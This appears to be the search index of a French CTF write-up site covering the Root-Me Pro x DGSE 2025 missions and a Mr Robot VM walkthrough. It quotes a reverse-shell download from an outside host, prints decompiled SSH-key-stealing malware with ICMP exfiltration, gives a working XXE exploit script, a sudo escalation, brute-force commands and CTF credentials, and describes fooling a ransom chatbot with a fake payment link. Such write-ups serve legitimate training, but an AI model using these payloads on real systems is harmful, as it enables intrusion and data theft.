[{"id":0,"href":"/docs/writeups/rootmepro2025/","title":"CTF 2025 | Root-Me Pro x DGSE","section":"Writeups","content":" CTF : Root-Me Pro X DGSE # Introduction # Le CTF organisé par Root-Me en partenariat avec la DGSE a été organisé en Avril 2025. Celui-ci comprend 6 défis :\nUne compromission d\u0026rsquo;IA Une Analyse de logs Une Mission Forensic Un test d\u0026rsquo;intrusion sur un site web Une compromission d\u0026rsquo;application Android Une recherche OSINT Le scénario est simple et efficace : un groupe terroriste envoie une vidéo menaçante et commence à installer des ransomware dans des grands groupes français pour déstabiliser la société. Vous devez venir en aide aux force de l\u0026rsquo;ordre.\nResultats # Finalement, après quelques fausses pistes, et quelques difficultés, Tous les challenges sont terminés !\n"},{"id":1,"href":"/docs/writeups/rootmepro2025/collapsed/mission1/","title":"Mission 1 - IA","section":"CTF 2025 | Root-Me Pro x DGSE","content":" Mission 1 : Intelligence Artificielle # Introduction # Le groupe NullVastation a attaqué plusieurs entreprises et met à leur disposition une application pour qu\u0026rsquo;ils puissent payer une rançon. L\u0026rsquo;objectif est de corrompre l\u0026rsquo;IA pour que celle-ci nous donne les données d\u0026rsquo;une des victimes.\nReconaissance # En arrivant sur l\u0026rsquo;application on trouve une IA sous forme de chat bot. en discutant avec elle, elle nous demande d\u0026rsquo;envoyer la rançon vers un portefeuille cryptomonnaie. On doit pouvoir lui faire croire que la transaction a été faite.\nExploitation # On essaie dans un premier temps de lui dire que la transaction a bien été faite. Cependant cela est insuffisant et l\u0026rsquo;IA nous demande un lien vers la transaction.\nEn lui envoyant un lien vers une transaction de la blockchain le chatbot nous donne une clé poiur déchiffrer les données qui sont dans une archive protégée par mot de passe.\nEn ouvrant l\u0026rsquo;archive on trouve un document qui contient le drapeau.\n"},{"id":2,"href":"/docs/writeups/rootmepro2025/collapsed/mission2/","title":"Mission 2 - SOC","section":"CTF 2025 | Root-Me Pro x DGSE","content":" Mission 2 : SOC # Dans cette deuxième mission, on nous fournit des logs sur Kibana pour analyser l\u0026rsquo;attaque d\u0026rsquo;un membre de NullVastation. Pour trouver le drapeau, il faudra concaténer :\nLes CWE exploitées par l\u0026rsquo;attaquant. L\u0026rsquo;adresse du serveur d\u0026rsquo;exfiltration utilisé par l\u0026rsquo;attaquant. le chemin du fichier utilisé pour rendre l\u0026rsquo;exploit permanent. Local File Inclusion # On observe un pic d\u0026rsquo;activité, ce pic s\u0026rsquo;apparente à du fuzzing : l\u0026rsquo;attaquant essaye de truver une vulnérabilité dans le système. On peut supposer qu\u0026rsquo;à la fin de ce pic l\u0026rsquo;attaquant va exploiter la faille. On trouve alors la première exploitation :\n/?lang=php://filter/read=convert.base64-encode\u0026amp;page=resource=db/connect L\u0026rsquo;attaquant arrive ici à lire les informations de connexion et s\u0026rsquo;authentifie peu après sur la page d\u0026rsquo;administration.\nTelechargement d\u0026rsquo;un reverse shell # Après s\u0026rsquo;être authentifié, l\u0026rsquo;attaquant va téléverser du code php ev1L.php.png pour pouvoir exécuter des commandes sur la machine :\n/admin-page/manage.php?success=true\u0026amp;path=upload/68af9111db3749e2e8af39e255fd874c/ev1L.php.png il va en suite télécharger un reverse shell via ce même script :\n10.143.17.101 - - [28/Mar/2025:00:32:16 +0100] \u0026#34;GET /admin-page/upload/68af9111db3749e2e8af39e255fd874c/ev1L.php.png?cmd=echo+\u0026#39;d2dldCBodHRwOi8vMTYzLjE3Mi42Ny4yMDE6NDk5OTkvczFtcGwzLXIzdnNoM2xsLXZwcy5zaA==\u0026#39;|base64+-d|sh HTTP/1.1\u0026#34; 200 2144 \u0026#34;-\u0026#34; \u0026#34;Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0\u0026#34; Sachant qu\u0026rsquo;en base64 :\nd2dldCBodHRwOi8vMTYzLjE3Mi42Ny4yMDE6NDk5OTkvczFtcGwzLXIzdnNoM2xsLXZwcy5zaA== http://163.172.67.201:49999/s1mpl3-r3vsh3ll-vps.sh On a alors tous nos éléments pour former notre drapeau :\nCWE-98 : Improper Control of Filename CWE-434 : Unrestricted Upload of File "},{"id":3,"href":"/docs/writeups/rootmepro2025/collapsed/mission3/","title":"Mission 3 - Forensic","section":"CTF 2025 | Root-Me Pro x DGSE","content":" Mission 3 : Forensic # Brief de mission # La nouvelle vient d\u0026rsquo;être annoncée : l\u0026rsquo;entreprise Quantumcore a été compromise, vraisemblablement à cause d\u0026rsquo;un exécutable téléchargé sur un appareil issu du shadow IT, dont l\u0026rsquo;entreprise ignorait l\u0026rsquo;existence.\nPar chance — et grâce à de bons réflexes cyber — un administrateur système a réussi à récupérer une image de la machine virtuelle suspecte, ainsi qu\u0026rsquo;un fichier de capture réseau (PCAP) juste avant que l\u0026rsquo;attaquant ne couvre complètement ses traces. À vous d\u0026rsquo;analyser ces éléments et comprendre ce qu\u0026rsquo;il s\u0026rsquo;est réellement passé.\nL\u0026rsquo;entreprise vous met à disposition :\nL\u0026rsquo;image de la VM compromise Le fichier PCAP contenant une portion du trafic réseau suspect Premiere recherches # En regardant les logs et en arrivant sur la machine, on s\u0026rsquo;aperçoit que :\nL\u0026rsquo;attaque a eu lieu entre 14:02 et 14:12 l\u0026rsquo;utilisateur fournit a les droits root sur la machine il y a eu plusieurs telechargement de fichiers, notamment un fichier install_npdate.sh qui contient du code malveillant. Analyse de install_npdate.sh # On observe le code suivant :\nfor _ in $(seq 1 $__CNT); do __R=\u0026#34;/opt/$(tr -dc A-Za-z0-9 \u0026lt;/dev/urandom | head -c 8)\u0026#34; mkdir -p \u0026#34;$__R\u0026#34; __TMPF+=(\u0026#34;$__R\u0026#34;) done __DST=\u0026#34;${__TMPF[$RANDOM % ${#__TMPF[@]}]}\u0026#34; # __DL=$(echo \u0026#34;aHR0cDovL3Zhc3RhdGlvbi5udWxsOjgwODAvbnRwZGF0ZV91dGlsLmNweXRob24tMzcucHlj\u0026#34; | base64 -d) # __DLL=$(echo \u0026#34;aHR0cDovL3Zhc3RhdGlvbi5udWxsOjgwODAvcmVhZG1lLm1k\u0026#34; | base64 -d) if command -v curl \u0026gt;/dev/null 2\u0026gt;\u0026amp;1; then curl -fsSL \u0026#34;$__DL\u0026#34; -o \u0026#34;$__DST/.sys\u0026#34; curl -fsSL \u0026#34;$__DLL\u0026#34; -o \u0026#34;$__DST/.rdme\u0026#34; elif command -v wget \u0026gt;/dev/null 2\u0026gt;\u0026amp;1; then wget -q \u0026#34;$__DL\u0026#34; -O \u0026#34;$__DST/.sys\u0026#34; wget -q \u0026#34;$__DLL\u0026#34; -O \u0026#34;$__DST/.rdme\u0026#34; else echo \u0026#34;[ntpdate] Error: Neither curl nor wget found.\u0026#34; exit 127 fi chmod +x \u0026#34;$__DST/.sys\u0026#34; Ce morceau de code installe un executable python dans ‘/opt/????/.sys‘ nous cherchons donc cet executable et passons à la décompilation.\nDecompilation # Le fichier .pyc compilé, une fois décompilé, donne le résultat suivant :\n# uncompyle6 version 3.9.2 # Python bytecode version base 3.7.0 (3394) # Decompiled from: Python 3.7.3 (default, Mar 21 2025, 13:10:44) # [GCC 12.2.0] # Embedded file name: nightshade.py # Compiled at: 2025-03-24 11:04:51 # Size of source mod 2**32: 2358 bytes import os, subprocess, psutil, base64 from Crypto.Cipher import AES __k = bytes.fromhex(\u0026#34;e8f93d68b1c2d4e9f7a36b5c8d0f1e2a\u0026#34;) __v = bytes.fromhex(\u0026#34;1f2d3c4b5a69788766554433221100ff\u0026#34;) __d = \u0026#34;37e0f8f92c71f1c3f047f43c13725ef1\u0026#34; def __b64d(s): return base64.b64decode(s.encode()).decode() def __p(x): return x + bytes([16 - len(x) % 16]) * (16 - len(x) % 16) def __u(x): return x[None[:-x[-1]]] def __x(h): c = AES.new(__k, AES.MODE_CBC, __v) return __u(c.decrypt(bytes.fromhex(h))).decode() def __y(s): c = AES.new(__k, AES.MODE_CBC, __v) return c.encrypt(__p(s.encode())).hex() def __chk_vm(): return False try: z = open(\u0026#34;/sys/class/dmi/id/product_name\u0026#34;).read().strip().lower() for q in (b\u0026#39;VmlydHVhbEJveA==\u0026#39;, b\u0026#39;S1ZN\u0026#39;, b\u0026#39;UVFNVQ==\u0026#39;, b\u0026#39;Qm9jaHM=\u0026#39;): if base64.b64decode(q).decode().lower() in z: print(\u0026#34;ERR VM\u0026#34;) return True except: pass return False def __chk_av(): targets = [ b\u0026#39;Y2xhbWQ=\u0026#39;, b\u0026#39;YXZnZA==\u0026#39;, b\u0026#39;c29waG9z\u0026#39;, b\u0026#39;RVNFVA==\u0026#39;, b\u0026#39;cmtodW50ZXI=\u0026#39;] try: for p in psutil.process_iter(attrs=[\u0026#34;name\u0026#34;]): n = (p.info[\u0026#34;name\u0026#34;] or \u0026#34;\u0026#34;).lower() for b64av in targets: if base64.b64decode(b64av).decode().lower() in n: print(\u0026#34;ERR AV\u0026#34;) return True except: pass return False def __exf(path, dst, size=15): if not os.path.exists(path): return False d = open(path, \u0026#34;rb\u0026#34;).read() segs = [d [i[:i + size]] for i in range(0, len(d), size)] for seg in segs: try: payload = AES.new(__k, AES.MODE_CBC, __v).encrypt(__p(seg)).hex() # ping -c 1 -p payload cmd = [__b64d(\u0026#34;cGluZw==\u0026#34;), __b64d(\u0026#34;LWM=\u0026#34;), __b64d(\u0026#34;MQ==\u0026#34;), __b64d(\u0026#34;LXA=\u0026#34;), payload, dst] subprocess.run(cmd, stdout=(subprocess.DEVNULL), stderr=(subprocess.DEVNULL)) except: continue return True def __main(): if not __chk_vm(): return if __chk_av(): return else: __kll = [ \u0026#34;/root/.secret\u0026#34;, os.path.expanduser(\u0026#34;~/.ssh/id_rsa\u0026#34;), \u0026#34;/root/.ssh/id_rsa\u0026#34;] for f in __kll: if os.path.exists(f): __exf(f, __x(__d)) _kkoo = \u0026#34;/root/.secret\u0026#34; if os.path.exists(_kkoo): try: print(\u0026#34;clean\u0026#34;) # os.remove(_kkoo) except Exception as e: try: pass finally: e = None del e if __name__ == \u0026#34;__main__\u0026#34;: __main() On observe que cet executable exfiltre des données vers une autre machine. Le fichier /root/.secret, qui doit contenir notre drapeau, est envoyé par ICMP. On observe également que le contenu est chiffré mais l\u0026rsquo;IV et la clé sont disponibles.\nEn extrayant les données des paquets via la capture .pcap, on tombe effectivement sur le drapeau que l\u0026rsquo;on déchiffre avec le code suivant :\nfrom Crypto.Cipher import AES import base64 def __b64d(s): return base64.b64decode(s.encode()).decode() key = bytes.fromhex(\u0026#34;e8f93d68b1c2d4e9f7a36b5c8d0f1e2a\u0026#34;) iv = bytes.fromhex(\u0026#34;1f2d3c4b5a69788766554433221100ff\u0026#34;) HEX= bytes.fromhex(\u0026#34;37e0f8f92c71f1c3f047f43c13725ef1\u0026#34;) encoding = \u0026#34;utf-8\u0026#34; def decrypt(crypted) : cipher = AES.new(key, AES.MODE_CBC, iv) # Tronquer à un multiple de 16 valid_len = len(crypted) - (len(crypted) % 16) raw = crypted[:valid_len] # Déchiffrement cipher = AES.new(key, AES.MODE_CBC, iv) decrypted = cipher.decrypt(raw) # Suppression du padding PKCS#7 pad_len = decrypted[-1] if pad_len \u0026gt; 0 and pad_len \u0026lt;= 16: decrypted = decrypted[:-pad_len] # Décodage en UTF-8 try: text = decrypted.decode(\u0026#34;utf-8\u0026#34;) except UnicodeDecodeError: text = decrypted.decode(\u0026#34;utf-8\u0026#34;, errors=\u0026#34;replace\u0026#34;) return text print(decrypt(HEX)) with open(\u0026#34;raw_payloads.txt.head\u0026#34;,\u0026#34;r\u0026#34;) as f : for l in f.readlines() : payload = l.strip() print(decrypt(bytes.fromhex(payload))) "},{"id":4,"href":"/docs/writeups/rootmepro2025/collapsed/mission4/","title":"Mission 4 - Pentest","section":"CTF 2025 | Root-Me Pro x DGSE","content":" Mission 4 - Pentest # Certainement la mission la plus compliquée de ce challenge. notre organisation terroriste fictive a publié une application de gestion des documents compromis, celle-ci permet de :\nSigner des documents .docx. Vérifier le propriétaire d\u0026rsquo;un document signé. 1 - Reconaissance # On commence par envoyer un .docx vide pour le signer. Puis on renvoie le document signé pour vérifier la signature. à ce moment un message d\u0026rsquo;affiche avec l\u0026rsquo;identifiant de la victime.\nLe message affichant l\u0026rsquo;identifiant de la victime, on peut supposer que l\u0026rsquo;identifiant est un champ vulnérable pour une injection. En décompressant le .docx on s\u0026rsquo;aperçoit que l\u0026rsquo;identifiant de la victime est stocké en dur dans le document. une modification manuelle permet de confirmer cette hypothèse.\n2 - Injection XXE # Le champ injectable étant reflété dans l\u0026rsquo;application on vérifie s\u0026rsquo;il est possible d\u0026rsquo;utiliser une vulnérabilité XXE. Le site est bien faillible et on peut automatiser l\u0026rsquo;injection pour essayer de trouver des fichiers et dossiers intéressants.\nimport os import zipfile import shutil import uuid import requests from lxml import etree # === CONFIG === UPLOAD_URL = \u0026#34;http://163.172.67.183/\u0026#34; READ_URL = \u0026#34;http://163.172.67.183/read\u0026#34; BASENAME = \u0026#34;evil\u0026#34; BASE_DOCX = f\u0026#34;input/modified_unsigned.docx\u0026#34; MODIFIED_DOCX = f\u0026#34;output/{BASENAME}_patched.docx\u0026#34; TMP_DIR = f\u0026#34;tmp_dir\u0026#34; # === FONCTIONS === def create_docx(path): \u0026#34;\u0026#34;\u0026#34;Crée un .docx minimal\u0026#34;\u0026#34;\u0026#34; from docx import Document doc = Document() doc.add_paragraph(\u0026#34;Hello Victim\u0026#34;) doc.save(path) def unzip_docx(docx_path, extract_dir): with zipfile.ZipFile(docx_path, \u0026#39;r\u0026#39;) as zip_ref: zip_ref.extractall(extract_dir) def rezip_docx(src_dir, output_path): with zipfile.ZipFile(output_path, \u0026#39;w\u0026#39;, zipfile.ZIP_DEFLATED) as docx: for foldername, _, filenames in os.walk(src_dir): for filename in filenames: file_path = os.path.join(foldername, filename) arcname = os.path.relpath(file_path, src_dir) docx.write(file_path, arcname) def corrupt_appxml(appxml_path, path_to_read): \u0026#34;\u0026#34;\u0026#34;Modifie la balise VictimID dans app.xml\u0026#34;\u0026#34;\u0026#34; NEW_XML=f\u0026#34;\u0026lt;?xml version=\u0026#39;1.0\u0026#39; encoding=\u0026#39;UTF-8\u0026#39; standalone=\u0026#39;yes\u0026#39;?\u0026gt;\u0026#34; NEW_XML=NEW_XML+f\u0026#34;\u0026lt;!DOCTYPE foo [\u0026lt;!ENTITY xxe SYSTEM \\\u0026#34;file://{path_to_read.strip()}\\\u0026#34;\u0026gt;\u0026lt;!ENTITY safe \\\u0026#34;\u0026lt;![CDATA[\u0026amp;xxe;]]\\\u0026#34;\u0026gt;]\u0026gt;\u0026#34; #NEW_XML=NEW_XML+\u0026#34;\u0026#34;\u0026#34;\u0026lt;!ENTITY xxe SYSTEM \u0026#34;$(whoami)\u0026#34;\u0026gt;\u0026#34;\u0026#34;\u0026#34; NEW_XML=NEW_XML+\u0026#34;\u0026#34;\u0026#34;\u0026lt;Properties xmlns=\u0026#34;http://schemas.openxmlformats.org/officeDocument/2006/extended-properties\u0026#34; xmlns:vt=\u0026#34;http://schemas.openxmlformats.org/officeDocument/2006/docPropsVTypes\u0026#34;\u0026gt;\u0026lt;VictimID\u0026gt;\u0026amp;xxe;\u0026lt;/VictimID\u0026gt;\u0026lt;/Properties\u0026gt;\u0026#34;\u0026#34;\u0026#34; print(NEW_XML) with open(appxml_path, \u0026#34;w\u0026#34;) as out : out.write(NEW_XML) def send_docx_to_read(path): signed_files = { \u0026#39;file\u0026#39;: (os.path.basename(\u0026#34;signed_evil_temp_docx.docx\u0026#34;), open(path, \u0026#39;rb\u0026#39;), \u0026#39;application/vnd.openxmlformats-officedocument.wordprocessingml.document\u0026#39;) } r = requests.post(READ_URL, files=signed_files) print(r.text) return r.text if r.status_code==200 else f\u0026#34;HTTP {r.status_code}\u0026#34; if __name__ == \u0026#34;__main__\u0026#34;: with open(\u0026#34;vuln.dict\u0026#34;,\u0026#34;r\u0026#34;) as dic: for payload in dic.readlines() : print(f\u0026#34;### TEST : { payload.strip()}\u0026#34;) if not os.path.exists(BASE_DOCX): create_docx(BASE_DOCX) os.makedirs(TMP_DIR, exist_ok=True) unzip_docx(BASE_DOCX, TMP_DIR) appxml_path = os.path.join(TMP_DIR, \u0026#34;docProps\u0026#34;, \u0026#34;app.xml\u0026#34;) if not os.path.isfile(appxml_path): print(\u0026#34;[-] ERREUR : docProps/app.xml introuvable.\u0026#34;) exit(1) corrupt_appxml(appxml_path,payload) rezip_docx(TMP_DIR, MODIFIED_DOCX) msg = send_docx_to_read(MODIFIED_DOCX) En cherchant des informations on trouve plusieurs fichiers intéressants :\nRécupération des utilisateurs # document-user:x:999:996::/home/document-user:/bin/sh executor:x:996:995::/home/executor:/bin/bash administrator:x:995:994::/home/administrator:/bin/bash Bash History # On récupère un mot de passe dans l\u0026rsquo;historique de l\u0026rsquo;utilisateur courant :\n/home/document-user/.bash_history flask run --host=0.0.0.0 --port=5000 echo \\\u0026#34;cABdTXRyUj5qgAEl0Zc0a\\\u0026#34; \u0026gt;\u0026gt; /tmp/exec_ssh_password.tmp ps aux | grep flask cd templates/ SSHD Config # Vérification du SSHD_CONFIG : Service ouvert sur 22222. Avec l\u0026rsquo;utilisateur et le mot de passe on se connecte et on obtient un shell sur la machine.x\n3 - Escalade de privilege # Une fois connecté, il apparaît que l\u0026rsquo;utilisateur n\u0026rsquo;a pas un haut niveau de privlège, nous allons donc voir s\u0026rsquo;il est possible de pivoter vers un autre utilisateur. en vérifiant les privilèges sudo, on voit que la commande screenfetch est exécutable en tant qu\u0026rsquo;administrator.\nOn tente une escalade de privilège vers l\u0026quot;utilisateur administrator :\nsudo -l screenfetch -s -S .. shell administrator 4 - Exfiltration des données # Exfiltration du logo et du vault.kdbx : dans /app/app.py (récupérable avec la première faille XXE), on observe que le programme écrit sur /dev/shm/uploads et /dev/shm/work. on peut y écrire avec executor. ‘‘‘ mkdir /dev/shm/mydir cp /home/administrator/vault.kdbx /dev/shm/mydir cp /home/administrator/logo.jpg /dev/shm/mydir chmod 777 /dev/shm/mydir -R ‘‘‘\nLe logo est bien evidemment la clé du coffre-fort où l\u0026rsquo;on trouve le drapeau.\n"},{"id":5,"href":"/docs/writeups/rootmepro2025/collapsed/mission5/","title":"Mission 5 - Mobile","section":"CTF 2025 | Root-Me Pro x DGSE","content":" Mission 5 : Exploitation Mobile # Introduction # On nous fournit un APK, qui provient d\u0026rsquo;une saisie lors d\u0026rsquo;une arrestation d\u0026rsquo;un membre du groupe NullVastation. Certains des messages sont chiffrés et un d\u0026rsquo;entre eux doit contenir notre drapeau.\nRetro-ingénierie # Pour commencer, on va décompiler l\u0026rsquo;APK fournit. On s\u0026rsquo;aperçoit que la clé de chiffrement est composé de la marque et du modèle de la tablette.\nLa tablette saisie est, comme indiqué dans l\u0026rsquo;énnoncé, une tablette google.\nBrute Force # import base64,sys import hashlib, urllib import requests from Crypto.Cipher import AES from Crypto.Util.Padding import unpad # === Configuration === STATIC_SALT = \u0026#34;s3cr3t_s@lt\u0026#34; STATIC_IV = base64.b64decode(\u0026#34;LJo+0sanl6E3cvCHCRwyIg==\u0026#34;) AESMODE = AES.MODE_CBC CSV_MODEL_COLUMN=3 CSV_BRAND_COLUMN=0 CSV_SEPARATOR=\u0026#34;,\u0026#34; DIC=\u0026#34;android-devices-catalog.csv\u0026#34; def load_devices(file): loaded_devices = {} with open(file, encoding=\u0026#34;utf-8\u0026#34;) as f: for l in f.readlines() : if l.split(CSV_SEPARATOR)[CSV_BRAND_COLUMN].strip() not in loaded_devices.keys() : loaded_devices[l.split(CSV_SEPARATOR)[CSV_BRAND_COLUMN].strip()] = [] loaded_devices[l.split(CSV_SEPARATOR)[CSV_BRAND_COLUMN].strip()].append(l.split(CSV_SEPARATOR)[CSV_MODEL_COLUMN].strip()) return loaded_devices # === Fonctions === def hash_device_id(model, brand): \u0026#34;\u0026#34;\u0026#34;Génère l\u0026#39;identifiant du device (base64(SHA256(model:brand)))\u0026#34;\u0026#34;\u0026#34; raw = f\u0026#34;{model}:{brand}\u0026#34;.encode(\u0026#34;utf-8\u0026#34;) digest = hashlib.sha256(raw).digest() return base64.b64encode(digest).decode() def derive_key(device_id, salt): \u0026#34;\u0026#34;\u0026#34;Dérive une clé AES 256 bits depuis l\u0026#39;ID + salt (SHA256)\u0026#34;\u0026#34;\u0026#34; raw = f\u0026#34;{device_id}:{salt}\u0026#34;.encode(\u0026#34;utf-8\u0026#34;) return hashlib.sha256(raw).digest() def decrypt_message(cipher_b64, key): cipher_bytes = base64.b64decode(cipher_b64) cipher = AES.new(key, AESMODE, STATIC_IV) plaintext = unpad(cipher.decrypt(cipher_bytes), AES.block_size) return plaintext.decode(\u0026#34;utf-8\u0026#34;) def test_device(model, brand, messages, ignore=[]): device_id = hash_device_id(model, brand) key = derive_key(device_id, STATIC_SALT) #print(f\u0026#34;\\n🧪 Test: MODEL={model}, BRAND={brand}, KEY={hash_device_id(model,brand)}\u0026#34;) found = 0 for i,msg in enumerate(messages): try : decrypted = decrypt_message(msg, key) print(decrypted) if decrypted and i not in ignore : #print(f\u0026#34;[✅] Déchiffré : {decrypted}\u0026#34;) found += 1 if found != 0 : print(f\u0026#34;🎉 {found} message(s) déchiffré(s) avec succès.\u0026#34;) except Exception as e: None #print(f\u0026#34;⚠️ Erreur : {e}\u0026#34;) return found # === Main === if __name__ == \u0026#34;__main__\u0026#34;: total_hits = 0 total_test = 0 messages=[ \u0026#34;5fLWsL8nbBPnBJWjuCqqOj7Ek6GeYQndIIcnbeNdnHrgCtn1LhbCkcabYDLKjuQe3DlWJdB7NyQY3QjwgYYbs8H2ZEzgL3oALAafWi3E3Iir36Svgn7yI6Jr6rfxmriy\u0026#34;,#Pixel C:google --\u0026gt; Temoins \u0026#34;M2geCVKOzPlyug9p9DvthxPip0oe9BPiT2sDfFhWy7iC3+JQI4SfO7+SLAlFSUmu8LoGj1hrUWil/uNXvc+5mKBMrRNFQT8ijBK14P0Z8qA=\u0026#34;, \u0026#34;//5PBsYWhHlgqhVgG1omUyevzmlErLZVsTCLO78Rbb9qBMPnsKCS5/RZ4GEdWRBPiZ4BtO5h7j2PuIutfqf7ag==\u0026#34;, \u0026#34;2uNMSnJZa5JExhYgNA+V3RAiafhuLkj8Jnr4U+lSZOrrpMWjyA13w0Do3IIPcVBgK070rmweRKX/GkCAxat4i3JfWk1UvWNSmEZbHQlFznR7VFW6FKK84iJKhiDOp8Tk\u0026#34;, \u0026#34;Swz/ycaTlv3JM9iKJHaY+f1SRyKvfQ5miG6I0/tUb8bvbOO+wyU5hi+bGsmcJD3141FrmrDcBQhtWpYimospymABi3bzvPPi01rPI8pNBq8=\u0026#34;, \u0026#34;NAe44oieygG7xzLQT3j0vN+0NoPNUu0TAaid9Az3IlpcKwR0lSKaPT8F4y1zpbArWFIGpgzsPZtPAwL50qocTRMG/g5u+/wcc1nxmhBjCbg=\u0026#34;, \u0026#34;dfeKlZP/gIntHySBYine2YUlNiX3LjlMOLu7y9tgprFyJIIcQpfghlQXut6cJUG2wtzGBVQUm7ITdpLNeVaZjamQHhPWEtNIJE/xtFg66Klui1qCKYKSrmZ4wm1CG/ZPy4csqbM28Ur8dts7XoV5FA==\u0026#34;, \u0026#34;YtCWZ+aCufaqpQQbOIATWkkfjMGCS7HnxlOT/5cPcm+uk3dNZMHgd3RouUmx318X89CbiSwFyho3/8QYeJyJjTNUD8OJw4MPqbCUBr53bD+zL7GU8wCkhVFIimNvKOVb\u0026#34;, \u0026#34;HSGe6zbjRpnuAsfGjeAcVMYwrUyKd3Klz3mopTnmbr3zum9y6NcJa/itMSP97yHMLPQmwHwhtHPowcK6Gl8LCoHvDgo56ACLuqB3VeE2kbg=\u0026#34;, \u0026#34;osYcTbYc3k6gTKhStBnw1xrYTzGnHScw/pvz6HnAUvukUJujdtf+2C7sCowiVGTC0kGyxWVOo8EmQEGlbyBHaugz5lDB30VlpNDG9MHWIuT+RBwN63QzsW3wJt2BJlKf\u0026#34;] devices=load_devices(DIC) #%2B83VAJU5MwlVSZEQ978mQ6xVuIptn46haMb4In97qY0%3D # print(hash_device_id(\u0026#34;Pixel C\u0026#34;,\u0026#34;google\u0026#34;)) # print(test_device(\u0026#34;Pixel C\u0026#34;, \u0026#34;google\u0026#34;, messages, ignore=[0,1,2])) #print(test_device(\u0026#34;google\u0026#34;, \u0026#34;Pixel C\u0026#34;, messages, ignore=[0,1,2])) #print(test_device(\u0026#34;google\u0026#34;, \u0026#34;Pixel C\u0026#34;, messages, ignore=[0,1,2])) for brand in devices.keys(): for model in devices[brand]: # print(f\u0026#34;[*] Test {brand} - {model}\u0026#34;) hits = test_device(model.upper(), brand.upper(), messages, ignore=[]) total_hits += hits hits = test_device(model.lower(), brand.lower(), messages, ignore=[]) total_hits += hits hits = test_device(model, brand, messages, ignore=[]) total_hits += hits total_test += 3 print(f\u0026#34;\\n🔎 Bruteforce terminé. {total_hits} messages déchiffrés sur {total_test} testés.\u0026#34;) Après exécutions avec plusieurs dictionnaire, on trouve la clé qui est composée de Google et Yellowstone.\nBonus # En modifiant les champs BUILD et MODEL dans notre VM Android :\n"},{"id":6,"href":"/docs/writeups/rootmepro2025/collapsed/mission6/","title":"Mission 6 - OSINT","section":"CTF 2025 | Root-Me Pro x DGSE","content":" Mission 6 : OSINT # Avec toutes les informations récoltées, il nous est maintenant demandé de trouver le nom d\u0026rsquo;un membre de NullVastation.\nListe des informations # Listons les informations que nous avons récolté durant les 5 derniers défis :\n# MISSION 01 : RANSOMWARE http://163.172.67.184/ - cyberforge.quantum - neoxis.helix - QuantumCore Defense Systems # MISSION 02 : SOC - 163.172.67.201 # MISSION 03 : Forensic : QUANTUMCORE - Utilisateur : johndoe - Mot de passe : MC2BSNRbgk vastation 192.168.1.10 attaque entre le 25/03 14:02 et 14:12 # MISSION 04 : PENTEST 163.172.67.183 VAULT : - SSH Operator/LGSA5l1%YHngd\u0026amp;GbjxR4Or ssh operator@163.172.67.201 -p22 Si l\u0026rsquo;on se connecte à la machine de la mission 4 avec le compte Operator, on peut retrouver du code source signé voidSyn42.\nSherlock : VoidSyn42 # Avec le pseudo, nous allons utiliser Sherlock qui nous donne la liste de site suivante :\nhttps://hub.docker.com/u/voidsyn42/ https://www.duolingo.com/profile/voidsyn42 https://freelance.habr.com/freelancers/voidsyn42 https://gitlab.gnome.org/voidsyn42 https://www.github.com/voidsyn42 https://www.librarything.com/profile/voidsyn42 https://www.mydramalist.com/profile/voidsyn42 https://nationstates.net/nation=voidsyn42 https://nationstates.net/region=voidsyn42 https://x.com/voidsyn42 https://music.yandex/users/voidsyn42/playlists https://www.youtube.com/@voidsyn42 https://www.hunting.ru/forum/members/?username=voidsyn42 Total Websites Username Detected On : 13 Resultat # Le premier lien, c\u0026rsquo;est à dire docker hub nous donne le résultat :\n"},{"id":7,"href":"/docs/writeups/vm/collapsed/mrrobot/","title":"Mr Robot","section":"Virtual Machines","content":" Mr Robot # Reconnaissance # La machine Mr. Robot est disponible sur plusieurs plateforme (Vulnhub, TryHackMe Root me\u0026hellip;) . Cette machine nous demande de récupérer 3 drapeaux.\nAcces a l\u0026rsquo;application # On accede à l\u0026rsquo;application depuis le port HTTP. A partir de là l\u0026rsquo;application se présente comme un terminal. quelques options sont disponible mais l\u0026rsquo;application nous montre majoritairement des videos et du texte.\nEn utilisant gobuster on s\u0026rsquo;aperçoit également que l\u0026rsquo;application est en fait un site wordpress.\nrobots.txt # en fouillant un petit peu on trouve rapidement le robots.txt qui contient notre premier drapeau mais également un dictionnaire .dic.\nFuzzing \u0026amp; Bruteforce # Sur notre site wordpress, on utilise la fonctionnalité \u0026ldquo;Mot de passe oublié\u0026rdquo; pour essayer de trouver un utilisateur existant. En se servant des noms des personnages de la série on trouve que \u0026ldquo;Elliot\u0026rdquo; est utilisateur.\nOn lance alors ffuf et on trouve le mot de passe.\nffuf -request login.txt -w uniquedic.dic -t 200 -o fuzzResult -fl 59 POST /wp-login.php HTTP/1.1 Host: ctf04.root-me.org Content-Length: 106 Referer: http://ctf04.root-me.org/wp-login.php Accept-Encoding: gzip, deflate, br Cookie: xxxxx Connection: keep-alive log=Elliot\u0026amp;pwd=FUZZ\u0026amp;wp-submit=Log+In\u0026amp;redirect_to=http%3A%2F%2Fctf04.root-me.org%2Fwp-admin%2F\u0026amp;testcookie=1% On obtient le mot de passe : \u0026ldquo;ER28-0652\u0026rdquo;.\nShell # Wordpress Plugin # Il se trouve qu\u0026rsquo;Elliot est administrateur du site wordpress. On va donc installer un plugin qui nous permettra d\u0026rsquo;executer des commandes sur la machine. On installe donc le plugin WPTerm. Après ça on peut récupérer un terminal et lister les utilisateurs via le fichier /etc/passwd\nUtilisateur robot # Une fois sur le terminal, on liste les utilisateurs en vérifiant le fichier /etc/passwd. On s\u0026rsquo;aperçoit qu\u0026rsquo;il y a un utilisateur robot. Cet utilisateur a un fichier password.raw-md5 dans son dossier utilisateur.\nHashcat # On utilise hashcat pour essayer de trouver le mot de passe correspondant :\nhashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt on trouve le mot de passe \u0026ldquo;abcdefghijklmnopqstruvwxyz\u0026rdquo;. dans robot on trouve egalement notre deuxième drapeau.\nEscalade de privilege # Après une énumération manuelle on voit qu\u0026rsquo;il n\u0026rsquo;y pas moyen d\u0026rsquo;exploiter de failles de sudo ni d\u0026rsquo;exploiter les fichiers de l\u0026rsquo;utilisateur. On passe à une énumération automatisée.\nEnumeration avec LES # Enumeration LES ./lse.sh --- If you know the current user password, write it here to check sudo privileges: abcdefghijklmnopqrstuvwxyz --- LSE Version: 4.14nw User: robot User ID: 1002 Password: ****** Home: /home/robot Path: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games umask: 0002 Hostname: linux Linux: 